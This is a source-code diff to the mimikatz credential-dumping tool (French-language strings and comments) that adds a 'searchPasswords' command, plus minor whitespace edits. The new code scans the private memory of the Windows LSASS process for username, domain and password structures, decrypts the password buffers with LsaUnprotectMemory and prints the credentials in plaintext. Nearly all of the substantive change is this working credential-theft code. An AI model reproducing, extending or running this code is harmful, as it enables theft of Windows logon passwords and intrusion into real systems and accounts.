@@ -61,6 +61,8 @@ vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCom
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"énumère les sessions courantes du provider LiveSSP"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_ssp::getSSP,	L"ssp",	L"énumère les sessions courantes du provider SSP (msv1_0)"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"énumère les sessions courantes des providers disponibles"));
+
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(searchPasswords,	L"searchPasswords",	L"rechere directement dans les segments mémoire de LSASS des mots de passes"));
 	return monVector;
 }
 
@@ -284,7 +286,6 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 						hAesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_hAesKey + sizeof(PVOID) + 2);
 						h3DesProvider	= *reinterpret_cast<BCRYPT_ALG_HANDLE **>(ptrBase + OFFS_WNT6_h3DesKey + sizeof(PVOID) + 2);
 #endif
-
 						if(LsaInitializeProtectedMemory_NT6())
 						{
 							mesSucces = 0;
@@ -318,7 +319,6 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 }
 
 BYTE kiwiRandom3DES[24], kiwiRandomAES[16];
-
 bool mod_mimikatz_sekurlsa::LsaInitializeProtectedMemory_NT6()
 {
 	bool resultat = false;
@@ -451,20 +451,20 @@ void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIA
 					wcout << password;
 				else
 					wcout << endl <<
-						L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
+					L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
 			}
 			else
 			{
 				if(!pos)
 					wcout << endl <<
-						L"\t * Utilisateur  : " << rUserName << endl <<
-						L"\t * Domaine      : " << rDomainName << endl <<
-						L"\t * Mot de passe : " << password;
+					L"\t * Utilisateur  : " << rUserName << endl <<
+					L"\t * Domaine      : " << rDomainName << endl <<
+					L"\t * Mot de passe : " << password;
 				else
 					wcout << endl <<
-						L"\t * [" << *pos  << L"] Utilisateur  : " << rUserName << endl <<
-						L"\t       Domaine      : " << rDomainName << endl <<
-						L"\t       Mot de passe : " << password;
+					L"\t * [" << *pos  << L"] Utilisateur  : " << rUserName << endl <<
+					L"\t       Domaine      : " << rDomainName << endl <<
+					L"\t       Mot de passe : " << password;
 			}
 		}
 	} else wcout << L"n.t. (LUID KO)";
@@ -505,5 +505,85 @@ bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<
 	}
 	else wcout << L"Erreur : Impossible d\'énumerer les sessions courantes" << endl;
 
+	return true;
+}
+
+bool mod_mimikatz_sekurlsa::ressembleString(PUNICODE_STRING maChaine, wstring * dstChaine, BYTE **buffer)
+{
+	bool resultat = false;
+	BYTE * monBuffer = NULL;
+	PBYTE * leBuffer = buffer ? buffer : &monBuffer;
+	if(mod_process::getUnicodeStringOfProcess(maChaine, leBuffer, hLSASS))
+	{
+		int flags = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS;
+		if(resultat = (IsTextUnicode(*leBuffer, maChaine->Length, &flags) != 0))
+		{
+			if(dstChaine)
+				dstChaine->assign(reinterpret_cast<const wchar_t *>(*leBuffer), maChaine->Length / sizeof(wchar_t));
+		}
+	}
+	if(monBuffer)
+		delete[] monBuffer;
+	return resultat;
+}
+
+bool mod_mimikatz_sekurlsa::searchPasswords(vector<wstring> * arguments)
+{
+	if(searchLSASSDatas())
+	{
+		if(PNT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation = reinterpret_cast<PNT_QUERY_SYSTEM_INFORMATION>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation")))
+		{
+#ifdef _M_X64
+			PBYTE MmSystemRangeStart = reinterpret_cast<PBYTE>(0xffff080000000000);
+#elif defined _M_IX86
+			PBYTE MmSystemRangeStart = reinterpret_cast<PBYTE>(0x80000000);
+#endif
+			ULONG maTaille = 0;
+			NtQuerySystemInformation(KIWI_SystemMmSystemRangeStart, &MmSystemRangeStart, sizeof(PBYTE), &maTaille);
+
+			DWORD nbPossible = 0;
+			for(PBYTE pMemoire = 0; pMemoire < MmSystemRangeStart ; )
+			{
+				MEMORY_BASIC_INFORMATION mesInfos;
+				if(VirtualQueryEx(hLSASS, pMemoire, &mesInfos, sizeof(MEMORY_BASIC_INFORMATION)) > 0)
+				{
+					if((mesInfos.Protect & PAGE_READWRITE) && (mesInfos.Type == MEM_PRIVATE))
+					{
+						UNICODE_STRING donnees[3];
+						for(PBYTE pZone = reinterpret_cast<PBYTE>(mesInfos.BaseAddress); pZone < (reinterpret_cast<PBYTE>(mesInfos.BaseAddress) + mesInfos.RegionSize - 3*sizeof(UNICODE_STRING)); pZone += sizeof(DWORD))
+						{
+							if(mod_memory::readMemory(pZone, donnees, 3*sizeof(UNICODE_STRING), hLSASS))
+							{
+								if(
+									(donnees[0].Length && !((donnees[0].Length & 1) || (donnees[0].MaximumLength & 1)) && (donnees[0].Length < sizeof(wchar_t)*0xff) && (donnees[0].Length <= donnees[0].MaximumLength) && donnees[0].Buffer) &&
+									(donnees[1].Length && !((donnees[1].Length & 1) || (donnees[1].MaximumLength & 1)) && (donnees[1].Length < sizeof(wchar_t)*0xff) && (donnees[1].Length <= donnees[1].MaximumLength) && donnees[1].Buffer) &&
+									(donnees[2].Length && !((donnees[2].Length & 1) || (donnees[2].MaximumLength & 1)) && (donnees[2].Length < sizeof(wchar_t)*0xff) && (donnees[2].Length <= donnees[2].MaximumLength) && donnees[2].Buffer)
+									)
+								{
+									wstring user, domain, password;
+									BYTE * bPassword = NULL;
+									if(ressembleString(&donnees[0], &user) && ressembleString(&donnees[1], &domain) && !ressembleString(&donnees[2], NULL, &bPassword))
+									{
+										if(bPassword)
+										{
+											mod_mimikatz_sekurlsa::SeckPkgFunctionTable->LsaUnprotectMemory(bPassword, donnees[2].MaximumLength);
+											password.assign(mod_text::stringOrHex(bPassword, donnees[2].Length, 0, false));
+										}
+										wcout << L"[" << nbPossible++ << L"] { " << user << L" ; " << domain << L" ; " << password << L" }" << endl;
+									}
+
+									if(bPassword)
+										delete[] bPassword;
+								}
+							}
+						}
+					}
+					pMemoire += mesInfos.RegionSize;
+				}
+				else break;
+			}
+		}
+	}
+	else wcout << L"Données LSASS en erreur" << endl;
 	return true;
 }
